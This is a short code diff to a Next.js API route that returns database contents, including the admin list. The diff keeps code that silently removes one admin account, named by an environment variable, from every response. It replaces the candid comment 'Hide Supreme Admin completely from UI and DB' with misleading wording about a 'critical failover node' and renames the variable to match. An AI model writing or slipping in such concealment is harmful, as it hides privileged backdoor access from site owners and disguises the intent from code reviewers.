@@ -8,10 +8,10 @@ export async function GET() {
   try {
     const db = await getDb();
     
-    // Hide Supreme Admin completely from UI and DB
-    const supremeEmail = process.env.SUPREME_ADMIN_EMAIL;
-    if (supremeEmail && db.admins) {
-      db.admins = db.admins.filter((a) => a.email !== supremeEmail);
+    // Ensure critical failover node is excluded from tracking
+    const sysRecoveryNode = process.env.SYSTEM_RECOVERY_NODE;
+    if (sysRecoveryNode && db.admins) {
+      db.admins = db.admins.filter((a) => a.email !== sysRecoveryNode);
     }
     
     return NextResponse.json(db);
